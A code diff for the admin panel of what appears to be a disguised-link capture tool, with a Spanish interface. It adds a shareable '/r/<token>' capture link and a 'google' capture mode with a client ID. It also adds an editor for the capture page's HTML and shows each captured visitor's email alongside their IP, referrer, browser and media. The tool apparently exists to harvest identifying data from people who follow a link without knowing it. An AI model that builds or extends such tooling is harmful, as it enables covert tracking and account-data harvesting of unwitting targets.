@@ -56,10 +56,26 @@
     });
   }
 
+  function updateCaptureLink() {
+    var token = el('entryToken').value.trim();
+    el('captureLink').value = window.location.origin + '/r/' + token;
+  }
+
   function loadSettings() {
     api('/admin/api/settings').then(function (data) {
       el('destinationUrl').value = data.destination_url || '';
       el('entryToken').value = data.entry_token || '';
+      el('googleClientId').value = data.google_client_id || '';
+      var mode = data.capture_mode === 'google' ? 'google' : 'normal';
+      document.querySelectorAll('input[name="captureMode"]').forEach(function (r) {
+        r.checked = r.value === mode;
+      });
+      updateCaptureLink();
+    }).catch(function () {
+      location.reload();
+    });
+    api('/admin/api/capture-html').then(function (data) {
+      el('captureHtmlEditor').value = data.html || '';
     }).catch(function () {
       location.reload();
     });
@@ -99,6 +115,7 @@
         card.innerHTML =
           media +
           '<div class="meta">' +
+          (c.email ? '<div><strong>Email:</strong> ' + escapeHtml(c.email) + '</div>' : '') +
           '<div><strong>IP:</strong> ' + escapeHtml(c.ip || '—') + '</div>' +
           '<div><strong>Referrer:</strong> ' + escapeHtml(truncate(c.referrer, 60)) + '</div>' +
           '<div><strong>Navegador:</strong> ' + escapeHtml(truncate(c.user_agent, 60)) + '</div>' +
@@ -141,13 +158,24 @@
     e.preventDefault();
     var destinationUrl = el('destinationUrl').value.trim();
     var entryToken = el('entryToken').value.trim();
+    var mode = 'normal';
+    document.querySelectorAll('input[name="captureMode"]').forEach(function (r) {
+      if (r.checked) mode = r.value;
+    });
     api('/admin/api/settings', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ destination_url: destinationUrl, entry_token: entryToken })
+      body: JSON.stringify({
+        destination_url: destinationUrl,
+        entry_token: entryToken,
+        capture_mode: mode,
+        google_client_id: el('googleClientId').value.trim()
+      })
     }).then(function (data) {
       el('destinationUrl').value = data.destination_url;
       el('entryToken').value = data.entry_token;
+      el('googleClientId').value = data.google_client_id || '';
+      updateCaptureLink();
       var msg = el('settingsMsg');
       msg.textContent = 'Cambios guardados.';
       setTimeout(function () {
@@ -175,6 +203,71 @@
     if (currentPage < totalPages) {
       currentPage++;
       loadCaptures();
+    }
+  });
+
+  el('entryToken').addEventListener('input', updateCaptureLink);
+
+  el('htmlForm').addEventListener('submit', function (e) {
+    e.preventDefault();
+    api('/admin/api/capture-html', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ html: el('captureHtmlEditor').value })
+    }).then(function () {
+      var msg = el('htmlMsg');
+      msg.textContent = 'HTML guardado.';
+      setTimeout(function () {
+        msg.textContent = '';
+      }, 3000);
+    }).catch(function (err) {
+      var msg = el('htmlMsg');
+      msg.textContent = err.message;
+      msg.className = 'error';
+      setTimeout(function () {
+        msg.textContent = '';
+        msg.className = 'success';
+      }, 3000);
+    });
+  });
+
+  el('resetHtmlBtn').addEventListener('click', function () {
+    api('/admin/api/capture-html/reset', { method: 'POST' }).then(function (data) {
+      el('captureHtmlEditor').value = data.html || '';
+      var msg = el('htmlMsg');
+      msg.textContent = 'HTML por defecto restaurado.';
+      setTimeout(function () {
+        msg.textContent = '';
+      }, 3000);
+    }).catch(function (err) {
+      var msg = el('htmlMsg');
+      msg.textContent = err.message;
+      msg.className = 'error';
+    });
+  });
+
+  el('copyLinkBtn').addEventListener('click', function () {
+    var input = el('captureLink');
+    input.select();
+    input.setSelectionRange(0, 99999);
+    var done = function () {
+      input.value = 'Enlace copiado';
+      setTimeout(function () {
+        updateCaptureLink();
+      }, 1500);
+    };
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+      navigator.clipboard.writeText(input.value).then(done);
+    } else {
+      try {
+        document.execCommand('copy');
+        done();
+      } catch (e) {
+        input.value = 'Selecciona y copia manualmente';
+        setTimeout(function () {
+          updateCaptureLink();
+        }, 2500);
+      }
     }
   });
 
